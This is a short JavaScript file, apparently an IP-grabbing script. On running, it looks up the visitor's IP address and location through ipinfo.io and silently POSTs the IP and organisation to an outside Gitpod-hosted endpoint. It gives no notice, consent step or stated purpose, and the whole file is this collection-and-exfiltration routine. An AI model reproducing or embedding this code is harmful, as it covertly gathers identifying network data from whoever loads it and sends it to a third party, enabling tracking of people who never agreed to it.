async function grab() {
  const data = await fetch('https://ipinfo.io/json')
  const { ip, loc, country, city, org } = await data.json()
  const res = await fetch('https://3000-intfract-security-cvtxi07zov1.ws-us89.gitpod.io/ip', {
    method: 'POST',
    body: JSON.stringify({
      ip,
      org,
    }),
    headers: {
      'Content-Type': 'application/json',
    }
  })
  console.log(await res.json())
}

grab()